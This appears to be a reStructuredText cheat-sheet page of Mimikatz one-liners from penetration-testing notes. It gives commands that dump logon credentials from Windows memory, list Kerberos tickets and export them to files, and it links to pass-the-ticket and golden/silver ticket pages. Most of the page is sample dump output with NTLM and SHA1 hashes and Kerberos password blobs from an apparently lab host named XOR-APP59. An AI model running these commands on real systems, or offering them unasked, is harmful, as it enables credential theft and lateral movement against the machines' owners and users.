Mimikatz one liners
*********************

.. toctree::
   :maxdepth: 1
   :caption: Contents:

   mimikatz/Pass_the_ticket
   mimikatz/Gol-Sil_Ticket

Extract encrypted credentials

.. code-block:: console

   ./mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"
   
example

.. code-block:: console

   mimikatz(commandline) # sekurlsa::logonpasswords 
   
   Authentication Id : 0 ; 337803 (00000000:0005278b) 
   Session : Interactive from 0 
   User Name : Administrator 
   Domain : XOR-APP59 
   Logon Server : XOR-APP59 
   Logon Time : 9/20/2021 2:39:23 AM 
   SID : S-1-5-21-3051798232-4248191986-2095020414-500 
   msv :  
   [00000003] Primary 
   * Username : Administrator 
   * Domain : XOR-APP59 
   * NTLM : 3fee04b01f59a1001a366a7681e95699 
   * SHA1 : 3a8679fbfdfea03f2d3b5a1a1aa185cca912014b 
   tspkg :  
   wdigest :  
   * Username : Administrator 
   * Domain : XOR-APP59 
   * Password : (null) 
   kerberos :  
   * Username : Administrator 
   * Domain : XOR-APP59 
   * Password : (null) 
   ssp :  
   credman :  
   
   Authentication Id : 0 ; 61430 (00000000:0000eff6) 
   Session : Interactive from 1 
   User Name : DWM-1 
   Domain : Window Manager 
   Logon Server : (null) 
   Logon Time : 9/20/2021 2:37:00 AM 
   SID : S-1-5-90-0-1 
   msv :  
   [00000003] Primary 
   * Username : XOR-APP59$ 
   * Domain : xor 
   * NTLM : 88dc819320671b0937ac2d2c80f6b602 
   * SHA1 : c1c7f6bfa52bc06797fb7682cc1584d073dc40cf 
   tspkg :  
   wdigest :  
   * Username : XOR-APP59$ 
   * Domain : xor 
   * Password : (null) 
   kerberos :  
   * Username : XOR-APP59$ 
   * Domain : xor.com 
   * Password : f3 ac dd e8 9d 72 73 e2 57 b6 1d 24 2f 17 79 8e cf 20 00 5b 3d 37 9b 57 74 fe f9 39 63 3f 5e 8b cc 90 b8 d5 d3 71 af 69 fd d3 cf a3 f2 d3 e9 90 0f 34 b1 60 dc 4f 5b da b1 56 be c4 3b de ee cf 0d 1d 01 eb bf 16 05 c4 a3 1e d1 dd a7 8f 9f 96 73 ed a6 8a 38 04 73 06 92 f9 88 a1 74 cb 00 6e fd 35 9c 3f eb c5 25 01 b4 5f 45 2c a1 ef 8c b4 e6 05 54 fe 85 a9 61 21 cf 0d e9 f0 08 59 28 f3 a8 c4 33 37 ca 85 4a 15 54 4f 9b 66 cc 27 82 b4 3e a3 f8 60 c3 2e e4 71 bd 97 b9 b9 16 ff 0b 33 56 b9 02 33 d7 c3 ea 63 a0 7e 3a e2 04 eb 42 97 10 ae e4 4d 07 94 be 0a 88 94 0c 2e 3c e5 61 4f bd aa 23 9e 55 74 81 48 9a 51 f8 8e 01 8b 74 86 21 40 a0 60 63 6c 42 05 19 c6 aa af d7 f8 25 3d 3a 21 ab 15 ac 1f d2 33 f0 cb bb a8 89 fe 08 b2  
   ssp :  
   credman :  
   
   Authentication Id : 0 ; 996 (00000000:000003e4) 
   Session : Service from 0 
   User Name : XOR-APP59$ 
   Domain : xor 
   Logon Server : (null) 
   Logon Time : 9/20/2021 2:36:59 AM 
   SID : S-1-5-20 
   msv :  
   [00000003] Primary 
   * Username : XOR-APP59$ 
   * Domain : xor 
   * NTLM : 88dc819320671b0937ac2d2c80f6b602 
   * SHA1 : c1c7f6bfa52bc06797fb7682cc1584d073dc40cf 
   tspkg :  
   wdigest :  
   * Username : XOR-APP59$ 
   * Domain : xor 
   * Password : (null) 
   kerberos :  
   * Username : xor-app59$ 
   * Domain : XOR.COM 
   * Password : (null) 
   ssp :  
   credman :  
   
   Authentication Id : 0 ; 429031 (00000000:00068be7) 
   Session : Interactive from 0 
   User Name : Administrator 
   Domain : XOR-APP59 
   Logon Server : XOR-APP59 
   Logon Time : 12/10/2021 1:29:18 AM 
   SID : S-1-5-21-3051798232-4248191986-2095020414-500 
   msv :  
   [00000003] Primary 
   * Username : Administrator 
   * Domain : XOR-APP59 
   * NTLM : 3fee04b01f59a1001a366a7681e95699 
   * SHA1 : 3a8679fbfdfea03f2d3b5a1a1aa185cca912014b 
   tspkg :  
   wdigest :  
   * Username : Administrator 
   * Domain : XOR-APP59 
   * Password : (null) 
   kerberos :  
   * Username : Administrator 
   * Domain : XOR-APP59 
   * Password : (null) 
   ssp :  
   credman :  
   
   Authentication Id : 0 ; 997 (00000000:000003e5) 
   Session : Service from 0 
   User Name : LOCAL SERVICE 
   Domain : NT AUTHORITY 
   Logon Server : (null) 
   Logon Time : 9/20/2021 2:37:00 AM 
   SID : S-1-5-19 
   msv :  
   tspkg :  
   wdigest :  
   * Username : (null) 
   * Domain : (null) 
   * Password : (null) 
   kerberos :  
   * Username : (null) 
   * Domain : (null) 
   * Password : (null) 
   ssp :  
   credman :  
    
   Authentication Id : 0 ; 61450 (00000000:0000f00a) 
   Session : Interactive from 1 
   User Name : DWM-1 
   Domain : Window Manager 
   Logon Server : (null) 
   Logon Time : 9/20/2021 2:37:00 AM 
   SID : S-1-5-90-0-1 
   msv :  
   [00000003] Primary 
   * Username : XOR-APP59$ 
   * Domain : xor 
   * NTLM : 7c13687d23a3a88e57fc9ef8bb4cdf2f 
   * SHA1 : 6c7ca462ec6e5895b79d6ebf70c202c1d15e49f0 
   tspkg :  
   wdigest :  
   * Username : XOR-APP59$ 
   * Domain : xor 
   * Password : (null) 
   kerberos :  
   * Username : XOR-APP59$ 
   * Domain : xor.com 
   * Password : 2c 7b b3 6e 01 67 62 86 dd e4 91 98 b9 c6 b1 06 16 cd ad c8 d9 f2 84 02 3b db 17 66 98 73 8c a0 c1 81 f5 ec 59 7c e4 94 70 74 ff c8 79 a3 67 52 4e c2 0c dc b1 42 ba 2f 97 93 17 a7 4b 10 35 a3 97 cd d7 b1 bc 48 3f 4a 79 73 4e 90 3a 02 1c 21 2f 06 a2 79 39 36 02 42 65 9e f3 48 df e9 c9 7a 35 3d 9a 0e 87 88 6f dd b6 c3 25 b6 ee 5f 38 cf f0 2f 8e 80 8e fb 12 32 c7 76 4e a4 ff 5c cc ec 74 27 64 34 c5 5f da ca 29 f0 60 15 fa 66 a2 72 0b ee 3f 6e 9e 98 7d 71 80 58 78 dd a7 f2 c9 b0 d9 0d 8e 3f c1 38 56 91 cf 57 7b c8 be f9 43 cf 41 ed 4d 16 1c 47 86 3e ee 1d 16 a4 4c 0d 28 a3 71 2f 04 ae 9d 4d 4a 42 5c 3b aa f7 5a 68 52 d4 3d 56 c9 d9 56 d0 83 e2 f0 17 3b 57 4d 85 1c b8 6a 1b 1f 30 15 d7 e5 34 8c 97 41 33 8f cd d7 85  
   ssp :  
   credman :  
    
   Authentication Id : 0 ; 32840 (00000000:00008048) 
   Session : UndefinedLogonType from 0 
   User Name : (null) 
   Domain : (null) 
   Logon Server : (null) 
   Logon Time : 9/20/2021 2:36:58 AM 
   SID :  
   msv :  
   [00000003] Primary 
   * Username : XOR-APP59$ 
   * Domain : xor 
   * NTLM : 88dc819320671b0937ac2d2c80f6b602 
   * SHA1 : c1c7f6bfa52bc06797fb7682cc1584d073dc40cf 
   tspkg :  
   wdigest :  
   kerberos :  
   ssp :  
   credman :  
   
   Authentication Id : 0 ; 999 (00000000:000003e7) 
   Session : UndefinedLogonType from 0 
   User Name : XOR-APP59$ 
   Domain : xor 
   Logon Server : (null) 
   Logon Time : 9/20/2021 2:36:58 AM 
   SID : S-1-5-18 
   msv :  
   tspkg :  
   wdigest :  
   * Username : XOR-APP59$ 
   * Domain : xor 
   * Password : (null) 
   kerberos :  
   * Username : xor-app59$ 
   * Domain : XOR.COM 
   * Password : (null) 
   ssp :  
   credman :  
   
shows tickets in  memeory

.. code-block:: console

   ./mimikatz.exe "privilege::debug" "sekurlsa::tickets" "exit"

Download `klist` to file

.. code-block:: console

   ./mimikatz1.exe "privilege::debug" "kerberos::list /export"
